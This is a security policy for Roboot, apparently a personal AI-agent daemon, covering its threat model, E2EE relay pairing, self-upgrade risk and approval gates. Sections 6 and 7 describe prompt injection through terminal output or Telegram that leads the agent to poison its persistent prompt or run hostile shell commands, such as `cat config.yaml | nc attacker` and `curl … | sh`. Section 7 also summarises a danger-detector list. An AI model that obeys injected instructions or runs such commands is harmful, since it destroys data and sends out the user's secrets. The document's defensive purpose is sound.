# Security

Honest accounting of what Roboot protects, where the gaps are, and how to report a vulnerability. Aimed at someone deciding whether to run it. If you'll expose Roboot beyond localhost, read it all.

## 1. Threat model

**Local machine (the Mac).** We assume the attacker does *not* have read access to the user account running the daemon. If they do, the game is over: `config.yaml` (API keys, Telegram token), `.identity/daemon.ed25519.key`, `.chat_history.db`, and `soul.md` sit on disk in plaintext (§2), and the agent inherits user shell permissions via `tools/shell.py` (mitigated but not eliminated by `ROBOOT_TOOL_APPROVAL`, §7). No in-process defense against a local attacker.

**Critical assumption: FileVault is enabled on the boot volume.** The local-attacker model above treats "lost / stolen laptop" as a no-op because full-disk encryption mounts the user home unreadable at rest. If FileVault is off, every file in §2 is readable by anyone who gets the disk. The console runs an `fdesetup status` probe on load (`/api/filevault-status`, `filevault_status.py`) and shows a red sticky banner when FileVault is off — dismiss at your peril. Per-file encryption was evaluated and dropped as theater: encrypting one file (e.g. `.chat_history.db`) while API keys and the ed25519 identity key stay plaintext gains nothing.

**LAN (same Wi-Fi).** Passive observers see TLS *if* you ran `python -m tools.generate_cert`; otherwise WebSocket is plaintext. The cert is self-signed, no pinning. An active Wi-Fi attacker who gets the user to accept a MITM cert reads and injects all traffic. Every `/ws`, `/api/sessions/*`, `/api/tts`, `/api/relay-*`, `/api/filevault-status`, and `/api/chat-history-wipe` endpoint is gated by a 256-bit LAN bearer token (see §2 row for the transport); the token is embedded in the startup URL / QR and stored in the browser's `localStorage` so pasted links work without re-auth. Reach + cert trust alone is not enough — a peer on the subnet without the token gets a 401.

**Cloudflare Worker relay (assume fully compromised).** The entire point of the E2EE design. The Worker can passively read every frame, actively drop/reorder/replay frames, and serve arbitrary JavaScript on `/pair/<id>`. It **cannot** decrypt application traffic or successfully MITM a new pairing: the AES-256-GCM key never leaves the endpoints, and the daemon's ed25519 identity is pinned via a URL-fragment fingerprint the Worker never sees. But: a malicious Worker can replace the pair page's JS. The E2EE guarantee therefore holds *only if* the user verifies the identity fingerprint on a known-good channel before first use. If the first JS you ever load is hostile, E2EE is bypassed from the inside.

**Mobile browser.** Assumed honest. A compromised device holds the plaintext key and DOM. Out of scope.

## 2. What's encrypted, what isn't

| Surface | Algorithm | Gap |
| --- | --- | --- |
| LAN WebSocket (`/ws`) and `/api/*` | TLS 1.2+ self-signed cert if present, else plaintext; gated by LAN bearer token (`Authorization: Bearer` / `Sec-WebSocket-Protocol: bearer.<token>`), auto-generated to `.auth/lan_token` (0600) | No cert pinning (TOFU) |
| Relay handshake (`e2ee_handshake`) | Plaintext over Worker TLS; ed25519-signed by daemon | Relay sees handshake pubkeys (metadata only) |
| Relay app frames (`encrypted`) | AES-256-GCM; key = HKDF-SHA256 of ECDH P-256 shared secret | No sequence counter; relay could replay a frame, but GCM auth will reject reused-IV within a key |
| Relay heartbeat (`ping`/`pong`) | Plaintext by design (Worker must route without keys) | Leaks liveness only |
| `.chat_history.db` | Plaintext SQLite — relies on FileVault for at-rest protection | Per-file encryption dropped as theater (§2 note). Manual wipe: 擦除所有聊天 button on console or `POST /api/chat-history-wipe` (runs `DELETE` + `VACUUM`). Retention via `ROBOOT_CHAT_RETENTION_DAYS` (default 30). |
| `soul.md` | Plaintext Markdown, committed to git | Agent writes are gated by `ROBOOT_SOUL_REVIEW` (off / log / confirm) — see §6. |
| `config.yaml` | Plaintext YAML (gitignored) | Holds LLM API keys + Telegram bot token |
| `.identity/daemon.ed25519.key` | Raw 32B ed25519 scalar, 0600 | Not encrypted at rest; deleting it invalidates every distributed pairing URL |
| `.faces/faces.json` | Plaintext face encodings | Biometric data in the clear |
| Session tokens in memory | Plaintext Python str | Memory dump out of scope |

## 3. Daemon identity & pairing trust chain

One long-term ed25519 keypair at `.identity/daemon.ed25519.key` (raw 32-byte private scalar, 0600, gitignored). The public half's fingerprint is `base32(SHA256(pub)[:16]).lower()` — 26 ASCII chars, ~80 bits. It ships in the pairing URL as `#fp=<fingerprint>`.

URL fragments are never transmitted in the HTTP request by any browser. The Worker that serves `/pair/<session>` never sees `#fp=...`, so the fingerprint reaches the mobile browser purely out-of-band (QR, AirDrop, chat).

Handshake verification (`relay_client.py::_on_handshake`, `relay/src/pair-page.ts::completeHandshake`):

```
Browser                     Relay (untrusted)             Daemon
   |                               |                         |
   | --{e2ee_handshake, client_id, |                         |
   |   pubkey=client_ephemeral}--> | --forwards--------->    |
   |                               |   verify                |
   |                               |   client_id ==          |
   |                               |     SHA256(pk)[:16].hex |
   |                               |   sign daemon_pub ‖     |
   |                               |     client_pub ‖        |
   |                               |     client_id           |
   |                               |     with ed25519 id key |
   | <--forwards------------------ | <-{pubkey, id_pubkey,   |
   |   {pubkey, id_pubkey, sig}    |    sig}------------     |
   |                               |                         |
   | verify: base32(sha256(id_pubkey)[:16]) == fp from fragment
   | verify: ed25519.verify(id_pubkey, sig, daemon_pub‖client_pub‖client_id)
   | on failure -> close 4003, no key derived
   | else: HKDF-SHA256(ECDH, info="roboot-relay-e2ee-v1") -> AES-256-GCM key
```

Two things break a relay MITM: swapping the ephemeral ECDH key produces a signature that fails ed25519 verify; swapping the identity key changes the fingerprint and fails the URL-fragment check. Both run before any key is derived. `client_id = SHA256(client_pub)[:16].hex()` binds the id to the pubkey so a token-holder cannot squat another client's slot.

Browser requirement: WebCrypto Ed25519 (Chrome 113+, Firefox 129+, Safari 17+). Older browsers fail closed.

## 4. Session-waiting notifications

`session_watcher.py` polls iTerm2 every 5 s, reads the last 10 tail lines of each Claude Code session, and pattern-matches for confirmation prompts. On an idle→waiting transition it fires a `notify` frame containing `project`, `prompt_line`, and `session_id`. The matched prompt line is ANSI-stripped, truncated to 200 chars, and HTML-escaped before being placed in the notify frame or shown to the user.

The frame broadcasts to every connected local console and every paired relay client. Relay-side notify frames go through the **same E2EE envelope** as chat (`server._relay_broadcast` calls `relay._send_to_client`, which always encrypts), so the Worker sees only ciphertext.

Privacy implication: the `prompt_line` text is whatever iTerm2 shows, and the `read_session` tool returns up to 1000 scrollback lines. If you hand a paired mobile browser to anyone, they can read every iTerm2 session and see every confirmation prompt as it fires. Treat a paired client as having full terminal read.

## 5. Code self-upgrade safety

`ROBOOT_AUTO_UPGRADE=1` opts into `self_upgrade.py`, which hourly runs `git fetch origin main`, `git pull --ff-only`, a 60-second `pytest` smoke test, then `os.execv`'s the process. **Anyone who lands a commit on the tracked git remote gets code execution on your daemon.**

In place: opt-in (default OFF); clean-tree check (`git status --porcelain`); in-flight check (`server.get_in_flight_count()`); smoke-test gate with SHA-pinned `git reset --hard <old_sha>` rollback; subprocess timeouts on every git call (30–60 s); no `shell=True`; notify frame broadcast to all clients before re-exec.

Gaps: **signed tags / commit signature verification are not implemented** — a compromised GitHub account or typosquatted remote means code execution. `pytest tests/` is a smoke test, not a security audit. If `origin` is ever rewritten to a hostile URL, the loop dutifully fetches from it.

Recommendation: leave `ROBOOT_AUTO_UPGRADE` unset unless you pull from a private fork you control, or have separately wrapped signed-tag verification around it.

## 6. `soul.md` as an attack surface

`soul.md` is self-writable via `tools/soul.py`. A prompt-injection attack — most plausibly through a Claude Code session tail read by `session_watcher.py` or the `read_session` tool — could instruct the agent to write hostile content into `soul.md`. Since `soul.md` is prepended to every future system prompt via `build_personality()`, such an injection **persists across daemon restarts and chat sessions**.

**Review gate (`soul_review.py`).** Every write to `soul.md` from `update_self` / `remember_user` / `add_note` / `append_self_feedback` is funneled through `review_write()` before it lands on disk. Mode selected by `ROBOOT_SOUL_REVIEW`:

- `off` (default, backwards compatible) — writes proceed.
- `log` — writes proceed AND the unified diff is persisted to `.soul/pending/<ts>-<origin>.diff` for after-the-fact audit.
- `confirm` — the daemon broadcasts a `{"type":"soul_review","req_id":...,"origin":...,"diff":...,"timeout_s":30}` frame to every connected console (local `/ws` + paired relay clients via the same E2EE envelope as chat). Both `static/console.html` and `relay/src/pair-page.ts` render a modal with the diff, a countdown bar, and 允许 / 拒绝 buttons. The choice returns as `soul_review_decision`; silence for the full timeout = REJECTED. Diffs over 2 KB are always REJECTED (too big to eyeball on a phone). Automated origins (periodic distiller + `append_self_feedback` on the sync path) degrade CONFIRM → LOG so the user isn't modal-spammed every K turns — the diff is still audited.

Other mitigations: `.soul/history/` keeps timestamped snapshots for hand-rollback; `soul.md` is committed to git, so `git diff` surfaces unexpected changes; the user can edit or delete any section. Hardening recommendation: run with `ROBOOT_SOUL_REVIEW=log` to build an audit trail without modals, or `confirm` if the daemon routinely reads untrusted agent output.

## 7. `run_command` as an attack surface

Same threat as §6, different code path. A prompt-injection payload that tells the agent to run `rm -rf ~/`, `curl … | sh`, or `cat config.yaml | nc attacker` lands in `tools/shell.py` and inherits the user's shell permissions. The injection vector is identical to §6 — most plausibly a manipulated Claude Code tail through `session_watcher.py` or `read_session`, or a hostile Telegram message.

**Approval gate (`tool_guard.py`).** Hooks Arcana's `ToolGateway.confirmation_callback`; `run_command` is decorated `requires_confirmation=True` so every call routes through `tool_guard.gate()` before dispatch. Mode selected by `ROBOOT_TOOL_APPROVAL`:

- `off` (default, backwards compatible) — bypass entirely; preserves pre-v0.4 behavior. Keep this on a single-user machine only if you trust everything that reaches the agent.
- `log` — non-dangerous calls pass through unchanged; calls matching the danger detector are still allowed but the call is recorded to `.tool_audit/<ts>-<tool>-LOGGED.json` for after-the-fact review.
- `confirm` — dangerous calls broadcast `{"type":"tool_approval","req_id":...,"tool":...,"args_summary":...,"danger_reason":...,"origin":...,"issued_at":...,"timeout_s":30}` to all three surfaces (local console + relay mobile + Telegram). The reply `{"type":"tool_approval_decision","req_id":...,"approved":bool}` resolves the gate. Silence for the full timeout = REJECTED. Args summary > 2 KB = REJECTED unconditionally.

Danger detector: 38 curated regexes covering `rm -rf` / `dd` / `sudo` / `curl … | sh` / `>>etc/` / `~/.ssh/` / Roboot at-rest paths (`config.yaml`, `.identity/`, `.faces/`) / git destructive ops / netcat reverse shell / macOS `osascript`/`launchctl`/`defaults write` persistence / fork bomb. Input is NFKC-normalized + ANSI-stripped + null-byte-stripped before matching, with a 16 KB hard cap (ReDoS guard). The detector applies *only* to the `command` argument of `shell` calls — no false positives on `look`, `list_sessions`, etc.

Allowlist at `~/.roboot/tool_allowlist.json` (per-machine, gitignored) lets the user whitelist routine commands by exact-or-prefix match with token boundaries. Entries containing shell metachars (`;`, `&`, backtick, `$(`, `||`, `>`, `<`, `|`, `\n`) are rejected at lookup time so `prefix: "ls; rm -rf"` cannot disarm the gate. The allowlist **cannot** override danger detection — a dangerous shell command goes to modal regardless of what the allowlist says.

The callback fails *closed*: any unexpected exception inside the gate returns False, surfacing `CONFIRMATION_REJECTED` to the agent rather than waving the call through. Telegram surface DMs only the *triggering user* (read from a contextvar set at message-receive boundary); cross-user clicks on the inline-keyboard message are rejected with a toast and don't touch the future, so a stranger who learns a `req_id` cannot approve another user's tool. Audit records under `.tool_audit/<ts>-<random>-<tool>-<status>.json` log every approved/rejected/timed-out/oversize call so a forensic trail exists even when the user clicks through quickly.

This **replaces** the legacy 8-entry substring blacklist in `tools/shell.py` (which returned a hardcoded "拒绝执行危险命令" string for matched substrings, gave the agent no useful error for everything else, and offered no mobile UX or audit trail). With `ROBOOT_TOOL_APPROVAL=off`, dangerous commands now run unconditionally — the gate IS the protection. Hardening recommendation: ship `log` to build an audit trail without modals, or `confirm` if the daemon routinely accepts input from untrusted surfaces (Telegram, paired remote clients, `session_watcher` reading sessions you don't fully control).

## 8. What to do if your pairing URL leaks

Open the local web console, press the red **撤销所有远程访问** button, or `POST /api/relay-revoke`. In one step this: (a) tells the Worker's Durable Object to broadcast `{"type":"revoked","reason":"daemon_revoked"}` to every connected client and close their sockets with code 4001; (b) deletes the stored pairing token on the relay so no new client can redeem the old URL; (c) rotates the daemon's `session_id` and token locally, killing the old WebSocket so the reconnect loop picks up fresh credentials. Old URL dead end-to-end; old ECDH keys wiped. Issue a new URL by rescanning the fresh QR.

Restarting the daemon is *weaker*: it rotates ephemeral ECDH state and the token, but since the ed25519 identity key is stable across restarts, the `#fp=` in the leaked URL still resolves. Use the revoke button.

## 9. Known gaps & roadmap

- `.chat_history.db` stays plaintext on disk and leans on FileVault. Per-file encryption was evaluated and dropped as theater (§2 note). Lightweight mitigations in place: `ROBOOT_CHAT_RETENTION_DAYS` auto-purge (default 30); 擦除所有聊天 button → `POST /api/chat-history-wipe` runs `DELETE` + `VACUUM`; FileVault-off warning banner.
- **LAN WebSocket uses self-signed TLS with trust-on-first-use; no cert pinning.** Evaluated 2026-04-24 and dropped as low-ROI: real cert pinning on browsers isn't possible (no HPKP), the only attacker model is "rogue AP during the first pairing second on the same LAN as the Mac", and the practical recommendation is "use the relay (E2EE, no TOFU) on any untrusted network." If itchy, a ~30min hand-compared cert-fingerprint-in-QR mitigation is feasible but still TOFU.
- Signed release tags are opt-in: set `ROBOOT_UPGRADE_REQUIRE_SIGNED_TAG=1` alongside `ROBOOT_AUTO_UPGRADE=1` and the loop will only pull when `origin/main` is at a commit pointed to by a `v*` tag that `git verify-tag` accepts. v0.4.0 is SSH-signed, so with the env var set the gate actually gates. Without the env var, the upgrade loop still trusts the git remote wholesale.
- No application-layer replay counter on E2EE frames. AES-GCM random IV makes plaintext replay unproductive, but no sequence numbers are tracked. A compromised relay could theoretically re-deliver an old ciphertext frame.
- Losing `.identity/daemon.ed25519.key` is permanent — every old pairing URL's `#fp=` fails forever. Back it up.
- `.faces/faces.json` stores biometric face encodings in plaintext.
- Secrets on disk (`config.yaml`, Telegram bot token) are plaintext. Highest-value at-rest target on the machine; relies on FileVault for protection. Keychain-backed secrets were evaluated and deferred (friction vs marginal gain in the single-user Mac threat model).
- No sandboxing for `shell` / iTerm2 tools: a paired remote client can run arbitrary shell commands with user privileges. Mitigated (not eliminated) by the `ROBOOT_TOOL_APPROVAL` gate (§7) — opt in to `log` or `confirm` to add an audit trail / approval modal in front of dangerous calls. Sandboxing was evaluated and rejected: Roboot's value is "agent runs on your real Mac"; chroot/Docker would defeat the purpose.
- Prompt injection via a manipulated Claude Code session tail reaches the agent through both the 20-line watcher scan and the `read_session` tool. Persistence path via `soul.md` is gated by `ROBOOT_SOUL_REVIEW` (§6); action path via `run_command` is gated by `ROBOOT_TOOL_APPROVAL` (§7); the runtime-side injection itself is not blocked.
- Telegram bot path is not E2EE — unavoidable; trusting Telegram the company is the price of a free hosted bot API.

Issues and PRs that move any of these forward are welcome.

## 10. Reporting a vulnerability

Email: **felixttysa@gmail.com**.

Please do **not** open public GitHub issues for security problems. There is no bounty — this is a personal project. I acknowledge reports and coordinate a fix / disclosure timeline in good faith.
